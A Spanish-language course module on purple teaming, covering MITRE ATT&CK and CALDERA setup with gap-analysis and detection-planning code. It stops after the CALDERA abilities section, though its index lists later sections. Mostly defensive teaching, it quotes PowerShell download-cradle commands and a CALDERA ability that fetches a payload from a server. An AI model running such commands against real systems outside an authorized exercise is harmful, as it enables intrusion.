# 07 - Purple Teaming y Automatización

> **Duración:** 6 días (48 hs teórico-prácticas)
> **Dificultad:** Avanzado
> **Role:** [purple team](../raw/p9rpl3-t34m.md) / Security Engineer / SOC

---

## Índice

> ⏱️ **Tiempo estimado:** 20 horas (~4 sesiones) (3512 lineas)


- [1. Introducción al Purple Teaming](#1-introducción-al-purple-teaming)
  - [1.1 Qué es Purple Team](#11-qué-es-purple-team)
  - [1.2 Diferencia entre Red, Blue y Purple](#12-diferencia-entre-red-blue-y-purple)
  - [1.3 Madurez del modelo de equipo](#13-madurez-del-modelo-de-equipo)
  - [1.4 Ciclo de vida del Purple Teaming](#14-ciclo-de-vida-del-purple-teaming)
- [2. MITRE ATT&CK Framework](#2-mitre-attck-framework)
  - [2.1 Fundamentos de ATT&CK](#21-fundamentos-de-attck)
  - [2.2 Tácticas, Técnicas y Procedimientos](#22-tácticas-técnicas-y-procedimientos)
  - [2.3 Sub-técnicas](#23-sub-técnicas)
  - [2.4 Enterprise Matrix](#24-enterprise-matrix)
  - [2.5 Mobile Matrix](#25-mobile-matrix)
  - [2.6 ICS Matrix](#26-ics-matrix)
  - [2.7 Uso de ATT&CK en Purple Teaming](#27-uso-de-attck-en-purple-teaming)
  - [2.8 Navegación y APIs de ATT&CK](#28-navegación-y-apis-de-attck)
- [3. CALDERA: Automated Adversary Emulation](#3-caldera-automated-adversary-emulation)
  - [3.1 Qué es CALDERA](#31-qué-es-caldera)
  - [3.2 Arquitectura de CALDERA](#32-arquitectura-de-caldera)
  - [3.3 Instalación y configuración](#33-instalación-y-configuración)
  - [3.4 Plugins de CALDERA](#34-plugins-de-caldera)
  - [3.5 Abilities y Adversaries](#35-abilities-y-adversaries)
  - [3.6 Operations y Facts](#36-operations-y-facts)
  - [3.7 Reporting en CALDERA](#37-reporting-en-caldera)
  - [3.8 REST API de CALDERA](#38-rest-api-de-caldera)
  - [3.9 Desarrollo de Abilities personalizadas](#39-desarrollo-de-abilities-personalizadas)
- [4. Atomic Red Team](#4-atomic-red-team)
  - [4.1 Qué es Atomic Red Team](#41-qué-es-atomic-red-team)
  - [4.2 Instalación](#42-instalación)
  - [4.3 Estructura de un Atomic Test](#43-estructura-de-un-atomic-test)
  - [4.4 Ejecución de pruebas](#44-ejecución-de-pruebas)
  - [4.5 Creación de Atomics personalizados](#45-creación-de-atomics-personalizados)
  - [4.6 Automatización con Invoke-AtomicRedTeam](#46-automatización-con-invoke-atomicredteam)
- [5. Defense Evaluation](#5-defense-evaluation)
  - [5.1 Mapeo de cobertura de detección](#51-mapeo-de-cobertura-de-detección)
  - [5.2 Gap Analysis](#52-gap-analysis)
  - [5.3 Medición de efectividad de controles](#53-medición-de-efectividad-de-controles)
  - [5.4 Matriz de cobertura](#54-matriz-de-cobertura)
- [6. Purple Team Exercises](#6-purple-team-exercises)
  - [6.1 Planificación de ejercicios](#61-planificación-de-ejercicios)
  - [6.2 Ejecución de ejercicios](#62-ejecución-de-ejercicios)
  - [6.3 Medición de resultados](#63-medición-de-resultados)
  - [6.4 Ciclo de reporte](#64-ciclo-de-reporte)
- [7. SIEM Tuning](#7-siem-tuning)
  - [7.1 Creación de reglas de detección](#71-creación-de-reglas-de-detección)
  - [7.2 Reducción de falsos positivos](#72-reducción-de-falsos-positivos)
  - [7.3 Sigma Rules](#73-sigma-rules)
  - [7.4 KQL y SPL para detección](#74-kql-y-spl-para-detección)
  - [7.5 Correlación de eventos](#75-correlación-de-eventos)
- [8. SOAR Integration](#8-soar-integration)
  - [8.1 Automatización de respuesta](#81-automatización-de-respuesta)
  - [8.2 Playbooks de respuesta](#82-playbooks-de-respuesta)
  - [8.3 Integración con herramientas](#83-integración-con-herramientas)
- [9. Métricas y KPIs](#9-métricas-y-kpis)
  - [9.1 Detection Time (MTTD)](#91-detection-time-mttd)
  - [9.2 Response Time (MTTR)](#92-response-time-mttr)
  - [9.3 Coverage Percentage](#93-coverage-percentage)
  - [9.4 Otras métricas esenciales](#94-otras-métricas-esenciales)
- [10. Laboratorio Final](#10-laboratorio-final)

---

## 1. Introducción al Purple Teaming

### 1.1 Qué es [purple team](../raw/p9rpl3-t34m.md)

Purple Team no es un equipo separado, sino una **metodología de colaboración** entre [red team](../raw/r3d-t34m-1nfr4.md) (ofensiva) y Blue Team (defensiva). El objetivo es mejorar la postura de seguridad mediante la ejecución conjunta de ejercicios controlados.

**Definición formal:**
> "Purple Teaming es el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de alinear los esfuerzos del [red team](../raw/r3d-t34m-1nfr4.md) y Blue Team para maximizar la efectividad de las capacidades de detección y respuesta de una organización, mediante la colaboración activa, el intercambio de conocimiento y la ejecución coordinada de ejercicios."

**Principios fundamentales:**
1. **Colaboración**: [red](../raw/r3d3s-f0nd4m3nt0s.md) y Blue trabajan juntos, no en competencia
2. **Transparencia**: Los TTPs se comparten abiertamente
3. **Medición**: Todo se mide y cuantifica
4. **Iteración**: Cada ejercicio mejora al anterior
5. **Automatización**: Los procesos repetitivos se automatizan

**Por qué el Purple Teaming es crítico hoy:**
Históricamente, el Red Team y el Blue Team operaban en silos. El Red Team encontraba vulnerabilidades, escribía un reporte, y se lo tiraba al Blue Team. El Blue Team, abrumado, priorizaba lo que podía. El resultado: gaps de seguridad que persistían por meses.

El Purple Teaming cambia ese paradigma. En lugar de trabajar en paralelo, Red y Blue trabajan juntos durante el ejercicio. El Blue Team ve en tiempo real qué está haciendo el Red Team, puede ajustar sus defensas, y aprende exactamente qué técnicas son detectadas y cuáles no.

**Ejemplo del mundo real:**
Una empresa financiera tenía un equipo Red Team externo que hacía pruebas una vez al año. Encontraban 50 hallazgos, pero el Blue Team solo podía remediar 20 antes del próximo test. Al implementar Purple Teaming mensual, redujeron el gap de detección de 70% a 15% en 6 meses.

**Diferencias clave en la práctica:**

El **Red Team** piensa como un adversario real. Busca formas creativas de entrar, moverse lateralmente, y alcanzar objetivos sin ser detectado. No le importa si el Blue Team mejora o no; su objetivo es demostrar que el ataque es posible.

El **Blue Team** piensa como un defensor. Monitorea logs, ajusta reglas SIEM, responde a incidentes, y configura herramientas de seguridad. Su objetivo es detectar y contener ataques lo antes posible.

El **Purple Team** piensa como un integrador. Toma los hallazgos del Red Team y los convierte en mejoras concretas para el Blue Team. No compite: facilita. Su objetivo es cerrar el gap entre lo que el Red Team puede hacer y lo que el Blue Team puede detectar.

### 1.2 Diferencia entre Red, Blue y Purple

| Aspecto | Red Team | Blue Team | Purple Team |
|---------|----------|-----------|-------------|
| Objetivo | Encontrar vulnerabilidades | Defender el entorno | Mejorar detección y respuesta |
| Enfoque | Ofensivo | Defensivo | Colaborativo |
| Conocimiento | TTPs de ataque | Defensa y monitoreo | Ambos |
| Relación | Competitivo | Competitivo | Colaborativo |
| Medición | Acceso obtenido | Tiempo de detección | Mejora de cobertura |
| Resultado | Reporte de hallazgos | Reporte de incidentes | Plan de mejora continua |

### 1.3 Madurez del modelo de equipo

**Nivel 1: Aislado**
- Red Team y Blue Team operan de forma independiente
- No comparten información
- Reportes separados
- Resultados: limitados

**Características del nivel 1:**
- El Red Team externalizado hace pruebas anuales
- Los reportes van a gerencia, no al SOC
- El Blue Team no sabe qué técnicas se probaron
- No hay mejora continua de detección
- Métricas: solo número de hallazgos

**Nivel 2: Informativo**
- Red Team comparte reportes con Blue Team
- Blue Team usa hallazgos para mejorar
- Pero no hay colaboración durante los ejercicios
- Resultados: mejoras reactivas

**Características del nivel 2:**
- El Blue Team recibe los reportes post-ejercicio
- Implementa reglas basadas en hallazgos pasados
- Pero no hay validación de que las reglas funcionen
- El gap de detección se reduce lentamente

**Nivel 3: Colaborativo**
- Ejercicios conjuntos planificados
- Comunicación durante los tests
- Resultados compartidos inmediatamente
- Resultados: mejoras proactivas

**Características del nivel 3:**
- Ejercicios mensuales o trimestrales
- Canal de comunicación dedicado (Slack/Teams)
- El Blue Team monitorea en vivo
- Se documenta qué se detectó y qué no en tiempo real

**Nivel 4: Integrado**
- Equipos trabajando juntos (Staff Cross-Functional)
- Automatización de tests y detección
- Métricas compartidas y dashboards en común
- Resultados: mejora continua

**Características del nivel 4:**
- Herramientas como CALDERA para automatizar tests
- Integración con el SIEM para validación automática
- Dashboards de cobertura de detección en tiempo real
- El gap analysis se actualiza automáticamente

**Nivel 5: Optimizado**
- Purple Teaming automatizado y continuo
- Detección y respuesta medidas y mejoradas constantemente
- Cultura de seguridad colaborativa
- Resultados: postura de seguridad madura

**Características del nivel 5:**
- [fuzzing](../raw/fuzz1ng.md) continuo de reglas de detección
- Ejercicios autónomos con CALDERA en modo adversarial
- Machine learning para identificar gaps de detección
- La organización responde a nuevas técnicas en días, no meses

### 1.4 Ciclo de vida del Purple Teaming

```
┌─────────────────────────────────────────────────────┐
│  Planificación                                        │
│  - Seleccionar TTPs del MITRE ATT&CK                │
│  - Definir alcance y objetivos                        │
│  - Preparar entorno de pruebas                        │
└────────────────────────┬────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│  Preparación                                         │
│  - Configurar sensores de detección                 │
│  - Asegurar captura de logs                          │
│  - Validar que las defensas están activas            │
└────────────────────────┬────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│  Ejecución                                           │
│  - Red Team ejecuta TTPs                             │
│  - Blue Team monitorea en tiempo real                 │
│  - Se documenta lo detectado y lo no detectado       │
└────────────────────────┬────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│  Medición                                            │
│  - Analizar gap de detección                         │
│  - Calcular MTTD, MTTR, coverage                     │
│  - Identificar brechas de telemetría                 │
└────────────────────────┬────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────┐
│  Mejora                                              │
│  - Crear/mejorar reglas de detección                 │
│  - Ajustar configuraciones de seguridad              │
│  - Automatizar respuestas                            │
└────────────────────────┬────────────────────────────┘
                         │
                         └── Volver a Planificación ──┘
```

**Ejemplo de ciclo completo de 4 semanas:**

**Semana 1 - Planificación:**
- Seleccionar 5 técnicas del [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck)
- Elegir técnicas basadas en: APTs relevantes para la industria, gaps de detección conocidos, nuevas técnicas emergentes
- Definir objetivos medibles: "detectar T1059.001 en menos de 5 minutos"
- Preparar el entorno: verificar que los sensores están activos

```python
purple_exercise_plan = {
    "exercise_name": "Q1-2025 PowerShell Detection",
    "techniques": [
        {"id": "T1059.001", "name": "PowerShell", "objective": "Detect encoded commands"},
        {"id": "T1003.001", "name": "LSASS Memory", "objective": "Detect Mimikatz-like access"},
        {"id": "T1547.001", "name": "Registry Run Keys", "objective": "Detect persistence"},
    ],
    "success_criteria": {
        "detection_rate": ">80%",
        "mttd": "<5 minutes",
        "false_positives": "<3 per technique"
    },
    "tools": {
        "red": ["CALDERA", "Atomic Red Team"],
        "blue": ["Splunk SIEM", "Microsoft Defender", "Sysmon"]
    }
}
```

**Semana 2 - Preparación:**
- Configurar dashboards en el SIEM para las técnicas seleccionadas
- Asegurar que los logs correctos se están generando
- Verificar que las reglas de detección existen
- Establecer canal de comunicación Red-Blue

```bash
# Verificar que los logs de PowerShell están habilitados
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled

# Verificar ScriptBlock Logging
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging

# Verificar Sysmon está corriendo
Get-Service Sysmon
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 1
```

**Semana 3 - Ejecución:**
- Lunes: T1059.001 - [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) execution
- Martes: T1003.001 - LSASS credential dumping
- Miércoles: T1547.001 - Registry persistence
- Jueves: T1566.001 - Spearphishing attachment (simulado)
- Viernes: Review y documentación

**Semana 4 - Medición y Mejora:**
- Analizar resultados de cada técnica
- Crear/mejorar reglas de detección
- Actualizar playbooks de respuesta
- Preparar reporte ejecutivo
- Planificar próximo ciclo


## 2. [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck) Framework

### 2.1 Fundamentos de ATT&CK

MITRE ATT&CK® es una base de conocimiento estructurada de comportamientos de atacantes. Es el lenguaje común entre [red](../raw/r3d3s-f0nd4m3nt0s.md) y Blue Team.

**Componentes principales:**
- Tactics: El "por qué" - el objetivo del atacante
- Techniques: El "cómo" - el método usado
- Procedures: La implementación específica
- Sub-techniques: Variantes detalladas
- Mitigations: Controles que previenen
- Detections: Cómo detectar la técnica

**Historia y evolución de ATT&CK:**
MITRE ATT&CK comenzó en 2013 como un proyecto interno para documentar comportamientos de APTs. En 2015 se lanzó públicamente con la matriz de Enterprise. Hoy es el estándar de facto para:

- **Red Teams**: Planificar y ejecutar emulaciones de adversarios
- **Blue Teams**: Evaluar cobertura de detección
- **SOC**: Priorizar alertas basadas en técnicas
- **Vendors**: Mapear capacidades de sus productos
- **Threat Intel**: Clasificar y compartir información de amenazas

**Estructura jerárquica:**

```
ATT&CK
├── Tactics (14 en Enterprise)
│   ├── Techniques (~200+)
│   │   ├── Sub-techniques (~400+)
│   │   │   ├── Procedures (infinitos)
│   │   │   └── Mitigations
│   │   └── Detections
│   └── Groups (APT associations)
└── Software (tooling)
```

### 2.2 Tácticas, Técnicas y Procedimientos

Las 14 tácticas del Enterprise Matrix: Reconnaissance (TA0043), Resource Development (TA0042), Initial Access (TA0001), Execution (TA0002), Persistence (TA0003), [privilege escalation](../raw/l1n9x-pr1v3sc.md) (TA0004), Defense Evasion (TA0005), Credential Access (TA0006), Discovery (TA0007), Lateral Movement (TA0008), Collection (TA0009), [command and control](../raw/r3v3rs3-sh3lls.md#command-and-control) (TA0011), Exfiltration (TA0010), Impact (TA0040).

**Cada táctica en detalle:**

| ID | Táctica | Descripción | Ejemplo de técnica |
|----|---------|-------------|-------------------|
| TA0043 | Reconnaissance | Recolectar información | T1595 - Active Scanning |
| TA0042 | Resource Development | Preparar infraestructura | T1583 - Acquire Infrastructure |
| TA0001 | Initial Access | Entrar al entorno | T1566 - [phishing](../raw/ph1sh1ng.md) |
| TA0002 | Execution | Ejecutar código malicioso | T1059 - Command and [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) Interpreter |
| TA0003 | Persistence | Mantener acceso | T1547 - Boot or Logon Autostart |
| TA0004 | Privilege Escalation | Obtener mayores [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) | T1068 - Exploitation for Privilege Escalation |
| TA0005 | Defense Evasion | Evadir defensas | T1562 - Impair Defenses |
| TA0006 | Credential Access | Robar credenciales | T1003 - OS Credential Dumping |
| TA0007 | Discovery | [reconocimiento](../raw/0s1nt.md#reconocimiento) interno | T1087 - Account Discovery |
| TA0008 | Lateral Movement | Moverse entre sistemas | T1021 - Remote Services |
| TA0009 | Collection | Recolectar datos de interés | T1005 - Data from Local System |
| TA0011 | Command and Control | Comunicación con [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) | T1071 - Application Layer Protocol |
| TA0010 | Exfiltration | Robar datos | T1048 - Exfiltration Over Alternative Protocol |
| TA0040 | Impact | Manipular, interrumpir o destruir | T1486 - Data Encrypted for Impact |

**Ejemplo T1059 - Command and Scripting Interpreter:**
Sub-técnicas: T1059.001 ([powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)), T1059.002 (AppleScript), T1059.003 (cmd), T1059.004 (Unix Shell), T1059.005 (VBScript), T1059.006 ([python](../raw/pyth0n-f0r-h4ck1ng.md)), T1059.007 (JavaScript), T1059.008 (Network CLI)

Mitigaciones: M1026 (Privileged Account Mgmt), M1038 (Execution Prevention), M1042 (Disable Feature)

Detecciones: Process monitoring, PowerShell ScriptBlock Logging (EventID 4104)

**Procedures (ejemplos reales de APTs):**
- **APT29 (Cozy Bear)**: Usa PowerShell para descargar cargas útiles desde Google Drive
- **APT3 (Gothic Panda)**: Usa cmd.exe para ejecutar scripts VBS en memoria
- **FIN7**: Usa JavaScript para ejecutar PowerShell en memoria

### 2.3 Sub-técnicas

Las sub-técnicas desglosan una técnica en variantes específicas.

**T1059.001 - PowerShell:**
- Ejecución: `powershell -enc <base64>`, `IEX (New-Object Net.WebClient).DownloadString()`
- Detección: EventID 4104 (ScriptBlock), 4103 ([pipeline](../raw/c1cd-h4ck1ng.md#pipeline)), 400 (Engine)

**T1059.003 - Windows Command Shell:**
- Ejecución: `cmd /c`, `cmd /k`, pipes, redirección
- Detección: EventID 4688 (Process Creation), CommandLine logging

**T1059.005 - Visual Basic:**
- Ejecución: Macros de Office, scripts .vbs
- Detección: EventID 4688 para wscript.exe/cscript.exe

**T1059.006 - Python:**
- Ejecución: `python -c`, scripts .py, py2exe
- Detección: Process creation para python.exe

**T1059.007 - JavaScript/JScript:**
- Ejecución: `.js` files, WSH, HTML Applications
- Detección: EventID 4688 para wscript.exe

### 2.4 Enterprise Matrix

La matriz Enterprise cubre Windows, Linux, macOS, y [cloud](../raw/cl0ud-h4ck1ng.md).

**Windows:**
T1547 (Autostart), T1053 (Scheduled Tasks), T1543 (System Process), T1562 (Impair Defenses)

**Linux:**
T1546.004 (.bashrc), T1547.006 ([kernel](../raw/0s-f0nd4m3nt0s.md#kernel) Modules), T1552.001 (Files)

**Cloud:**
T1613 ([container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores) Discovery), T1552.007 (Metadata API), T1078 (Valid Accounts)

### 2.5 Mobile Matrix

La matriz Mobile cubre [ios](../raw/10s-p3nt3st1ng.md) y [android](../raw/4db-d33p-d1v3.md).

**Initial Access (Malicious App):**
Instalación de aplicaciones maliciosas desde tiendas oficiales o sideloading.

**Execution (Native API):**
Llamadas a APIs nativas del [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos) móvil.

**Credential Access (Notifications, Clipboard):**
Lectura de notificaciones (Android 13+ restringido) y portapapeles.

**Exfiltration (Bluetooth, Cloud):**
Transferencia de datos vía Bluetooth, NFC, o servicios cloud.

### 2.6 [ics](../raw/0t-sc4d4.md) Matrix

Para [scada](../raw/0t-sc4d4.md)/PLC: Initial Access (External Remote Services), Execution (Change Program State), Persistence ([firmware](../raw/u3f1-r00tk1ts.md#firmware)), Evasion (Manipulate I/O), Impact (Block Reporting)

**ICS-specific tácticas:**
- **TA0108**: Inhibit Response Function - Bloquear la capacidad de respuesta
- **TA0107**: Impair Process Control - Manipular control de procesos físicos
- **TA0106**: Impact - Causar daño físico o interrupción

**Ejemplo real: Triton malware:**
- Apuntó a los Safety Instrumented Systems (SIS) de una planta petroquímica
- Manipuló los controladores Triconex para causar condiciones inseguras

### 2.7 ATT&CK en Purple Teaming

**Caso planificación:**
Seleccionar técnica, definir procedimiento, configurar detección, ejecutar, evaluar, mejorar.

```python
def plan_purple_test(technique_id, environment):
    plan = {
        "technique": technique_id,
        "environment": environment,
        "detection_sources": [],
        "test_procedures": [],
        "expected_alerts": [],
        "success_criteria": {}
    }
    detection_map = {
        "T1059.001": {
            "sources": ["Windows Event 4104", "Windows Event 4688"],
            "rules": ["PowerShell_ScriptBlock_Logging"]
        },
        "T1003.001": {
            "sources": ["Sysmon Event 10", "Windows Event 4663"],
            "rules": ["LSASS_Access_Detection"]
        },
        "T1547.001": {
            "sources": ["Sysmon Event 13", "Windows Event 4657"],
            "rules": ["Registry_Persistence_Detection"]
        }
    }
    if technique_id in detection_map:
        plan["detection_sources"] = detection_map[technique_id]["sources"]
        plan["expected_alerts"] = detection_map[technique_id]["rules"]
        plan["success_criteria"] = {
            "detected": True,
            "max_ttd_seconds": 300,
            "max_false_positives": 0
        }
    return plan
```

**Caso gap analysis:**
Listar técnicas a detectar, marcar reglas existentes, identificar gaps, priorizar.

```python
class GapAnalyzer:
    def __init__(self):
        self.techniques = {}
        self.gaps = []
        self.coverage = {}

    def add_technique(self, technique_id, name, existing_rules=None, risk="medium"):
        self.techniques[technique_id] = {
            "name": name,
            "rules": existing_rules or [],
            "risk": risk,
            "detected": len(existing_rules or []) > 0
        }

    def analyze_gaps(self):
        self.gaps = []
        for tid, info in self.techniques.items():
            if not info["detected"]:
                priority = {"critical": 10, "high": 7, "medium": 4, "low": 1}
                self.gaps.append({
                    "technique": tid,
                    "name": info["name"],
                    "priority": priority.get(info["risk"], 1),
                    "risk": info["risk"],
                    "action": f"Crear regla de detección para {info['name']}",
                    "estimated_effort": "2-4 hours"
                })
        self.gaps.sort(key=lambda x: x["priority"], reverse=True)
        return self.gaps

    def coverage_report(self):
        total = len(self.techniques)
        detected = sum(1 for t in self.techniques.values() if t["detected"])
        return {
            "total_techniques": total,
            "detected": detected,
            "coverage_pct": round(detected / total * 100, 2) if total > 0 else 0,
            "gaps": self.analyze_gaps()
        }

analyzer = GapAnalyzer()
analyzer.add_technique("T1059.001", "PowerShell", ["PS_ScriptBlock_Rule"], "high")
analyzer.add_technique("T1003.001", "LSASS Dumping", [], "critical")
analyzer.add_technique("T1547.001", "Registry Run Keys", ["Reg_Run_Key_Rule"], "medium")
print(analyzer.coverage_report())
```

**Caso heatmap:**
```
Heatmap de Cobertura de Detección
=========================================
Técnica          | Detectado | Regla                     | Notas
T1059.001        | ✓         | PS_ScriptBlock_Rule       | ScriptBlock Logging activo
T1003.001        | ✗         | -                         | Sin regla, gap crítico
T1547.001        | ✓         | Reg_Run_Key_Rule          | Sysmon Event 13
T1566.001        | ✗         | -                         | Gap, phishing sin detección
```

### 2.8 API STIX y automatización

```python
import requests, json

class ATTACKAPI:
    def __init__(self):
        self.url = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
        self.data = None
    def load(self):
        self.data = requests.get(self.url).json()
    def search(self, query):
        return [o for o in self.data["objects"] if o["type"]=="attack-pattern" and query.lower() in o.get("name","").lower()]
    def coverage(self, detected):
        all_t = [o for o in self.data["objects"] if o["type"]=="attack-pattern"]
        return {"total": len(all_t), "detected": len(detected), "pct": round(len(detected)/len(all_t)*100,1)}

if __name__ == "__main__":
    api = ATTACKAPI()
    api.load()
    print(api.coverage(["T1059.001","T1003","T1547"]))
```

**Uso avanzado de la API de ATT&CK:**

```python
class AdvancedAttackAPI:
    def __init__(self):
        self.base_url = "https://raw.githubusercontent.com/mitre/cti/master"
        self.enterprise_data = None
        self.mobile_data = None
        self.ics_data = None

    def load_all(self):
        urls = {
            "enterprise": f"{self.base_url}/enterprise-attack/enterprise-attack.json",
            "mobile": f"{self.base_url}/mobile-attack/mobile-attack.json",
            "ics": f"{self.base_url}/ics-attack/ics-attack.json"
        }
        for name, url in urls.items():
            print(f"[*] Cargando {name} ATT&CK...")
            resp = requests.get(url)
            setattr(self, f"{name}_data", resp.json())

    def get_techniques_by_tactic(self, tactic_id):
        techniques = []
        for obj in self.enterprise_data["objects"]:
            if obj.get("type") == "attack-pattern":
                for kill_chain in obj.get("kill_chain_phases", []):
                    if kill_chain.get("phase_name") == tactic_id:
                        techniques.append({
                            "id": obj["id"],
                            "name": obj["name"],
                            "description": obj.get("description", "")[:200]
                        })
        return techniques

    def generate_detection_requirements(self, technique_id):
        for obj in self.enterprise_data["objects"]:
            if obj.get("external_references"):
                for ref in obj["external_references"]:
                    if ref.get("external_id") == technique_id:
                        return {
                            "technique": obj["name"],
                            "data_sources": obj.get("x_mitre_data_sources", []),
                            "detection": obj.get("x_mitre_detection", ""),
                            "platforms": obj.get("x_mitre_platforms", [])
                        }
        return None

api = AdvancedAttackAPI()
api.load_all()
reqs = api.generate_detection_requirements("T1059.001")
print(json.dumps(reqs, indent=2))
```

## 3. CALDERA: Automated Adversary Emulation

### 3.1 Qué es CALDERA

CALDERA es un framework de emulación de adversarios desarrollado por MITRE. Permite automatizar ataques basados en [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck), evaluar defensas y hacer purple teaming.

**Características principales:**
- Automatización de TTPs del ATT&CK
- Plugin architecture para extensibilidad
- Agentes en múltiples plataformas (Windows, Linux, macOS)
- [rest api](../raw/4p1-s3cur1ty.md#rest-api) completa
- Reportes detallados
- Capacidad de operación autónoma (autonomous operation)

**Arquitectura:**

```
┌──────────────────────────────────────────────────┐
│  CALDERA Server (Python Flask)                    │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐         │
│  │  Core    │ │ Plugins  │ │  API     │         │
│  │  Engine  │ │          │ │  REST    │         │
│  └──────────┘ └──────────┘ └──────────┘         │
│                ┌──────────┐                      │
│                │ Database  │                      │
│                │ (SQLite)  │                      │
│                └──────────┘                      │
├──────────────────┬───────────────────────────────┤
│  Agent (Sandcat) │  Agent (54ndc47) │  Agent (Man)│
│  Windows         │  Linux/macOS    │  Manual     │
└──────────────────┴─────────────────┴─────────────┘
```

**Cómo se integra CALDERA en Purple Teaming:**
1. **Planificación**: Seleccionar un adversary profile (ej: APT29)
2. **Configuración**: Desplegar agentes en los endpoints target
3. **Ejecución**: Iniciar una operación contra los agentes
4. **Monitoreo**: El Blue Team observa en el SIEM qué detecta
5. **Medición**: CALDERA genera reportes de qué técnicas funcionaron
6. **Mejora**: Crear reglas para las técnicas no detectadas

**Ventajas de CALDERA sobre pruebas manuales:**
- Repetibilidad: el mismo test se puede ejecutar N veces
- Escalabilidad: de 1 a 1000 endpoints simultáneamente
- Documentación automática: cada ability ejecutada queda registrada
- Integración con ATT&CK: mapeo automático de técnicas
- Autonomous mode: CALDERA decide el próximo paso según el resultado anterior

### 3.2 Arquitectura de CALDERA

**Componentes del sistema:**

**Core Engine:**
- Manejador de operaciones (Operation Manager)
- Manejador de agentes (Agent Manager)
- Manejador de abilities (Ability Manager)
- Manejador de adversaries (Adversary Manager)
- Manejador de facts (Fact Manager)
- Planificador de operaciones

**Plugins:**
- Sandcat (agente Windows), 54ndc47 (agente Linux/macOS)
- Stockpile (abilities predefinidas), Fieldmanual (documentación)
- Man (agente manual), Response (automatización de respuesta)
- Gameboard (visualización de operaciones)

**Database:**
- SQLite por defecto
- Almacena: agents, operations, abilities, adversaries, facts, results

**Flujo de una operación CALDERA:**
1. Crear Adversary Profile (conjunto de abilities)
2. Desplegar agentes en los targets
3. Iniciar operación
4. CALDERA ejecuta abilities secuencialmente
5. Cada ability produce facts que alimentan la siguiente
6. Los resultados se almacenan en la base de datos
7. Generar reportes post-operación

### 3.3 Instalación y configuración

```bash
git clone https://github.com/mitre/caldera.git
cd caldera
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

**Configuración local.yml:**
```yaml
host: 0.0.0.0
port: 8888
plugins:
  - access
  - atomic
  - compass
  - debrief
  - fieldmanual
  - sandcat
  - stockpile
  - training
  - response
api_key_blue: BLUE_ADMIN_KEY
api_key_red: RED_ADMIN_KEY
crypt_salt: RANDOM_SALT_CHANGE_THIS
encryption_key: RANDOM_KEY_CHANGE_THIS
reports_dir: /tmp/caldera/reports
app.contact.http: http
app.contact.tcp: tcp
app.contact.websocket: websocket
```

**[docker](../raw/d0ck3r-f0r-h4ck3rs.md) deployment:**
```bash
docker run -p 8888:8888 mitre/caldera:latest
```

**Solución de problemas de instalación:**
```bash
# Error: módulo faltante
pip install -r requirements.txt --force-reinstall

# Error: puerto en uso
netstat -ano | findstr :8888

# Error: base de datos corrupta
python server.py --fresh
```

### 3.4 Plugins de CALDERA

**Plugins principales:**

| Plugin | Descripción | Desarrollador |
|--------|-------------|-------------|
| access | Gestión de acceso | MITRE |
| atomic | Integración con Atomic [red team](../raw/r3d-t34m-1nfr4.md) | MITRE |
| compass | Mapeo de cobertura | MITRE |
| debrief | Reportes post-operación | MITRE |
| fieldmanual | Documentación de abilities | MITRE |
| gameboard | Dashboard visual | MITRE |
| manx | Agente de chat | MITRE |
| response | Automatización de respuesta a incidentes | MITRE |
| sandcat | Agente Windows | MITRE |
| stockpile | Abilities predefinidas de ATT&CK | MITRE |
| training | Tutoriales | MITRE |

**Plugin atomic - Integración con Atomic [red team](../raw/r3d-t34m-1nfr4.md):**
```bash
# Verificar que el plugin atomic está instalado
ls plugins/atomic/

# Los tests atómicos aparecen como abilities en CALDERA
```

**Plugin compass - Mapeo de cobertura:**
```bash
# Acceder a /compass en la UI
# Permite subir resultados de operaciones, mapear contra ATT&CK,
# visualizar cobertura por táctica, e identificar gaps
```

**Plugin response - Automatización de respuesta:**
```yaml
response_rules:
  - technique: T1059.001
    actions:
      - type: isolate_endpoint
      - type: block_process
        process: powershell.exe
      - type: send_alert
        channel: slack
        message: "PowerShell execution detected on {host}"
```

### 3.5 Abilities y Adversaries

**Abilities** son los TTPs individuales que CALDERA puede ejecutar.

**Estructura de un Ability:**

```yaml
id: 12345678-1234-1234-1234-123456789012
name: Download PowerShell Payload
description: Download a payload using PowerShell
tactic: execution
technique_id: T1059.001
technique_name: Command and Scripting Interpreter: PowerShell
platforms:
  windows:
    ps1:
      command: |
        Invoke-WebRequest -Uri http://#{server}/#{payload} -OutFile C:\Windows\Temp\payload.exe
      payloads:
        - payload.exe
      parsers:
        plugins.stockpile.parsers.download:
          source: server
          edge: server
      cleanup:
        - Remove-Item C:\Windows\Temp\payload.exe -Force
requirements:
  - module: plugins.stockpile.requirements.basic
    relationship_match:
      - source: server
        edge: has
        target: payload.exe
privilege: USER
executor: ps1
```

**Campos de un Ability:**

| Campo | Descripción | Obligatorio |
|-------|-------------|-------------|
| id | UUID único | Sí |
| name | Nombre descriptivo | Sí |
| description | Descripción detallada | Sí |
| tactic | Táctica ATT&CK | Sí |
| technique_id | ID de técnica ATT&CK | Sí |
| technique_name | Nombre de técnica | Sí |
| platforms | Plataformas objetivo | Sí |
| executor | Tipo de ejecutor (ps1, sh, cmd) | Sí |
| command | Comando a ejecutar | Sí |
| payloads | Archivos necesarios | No |
| parsers | Parsea el output | No |
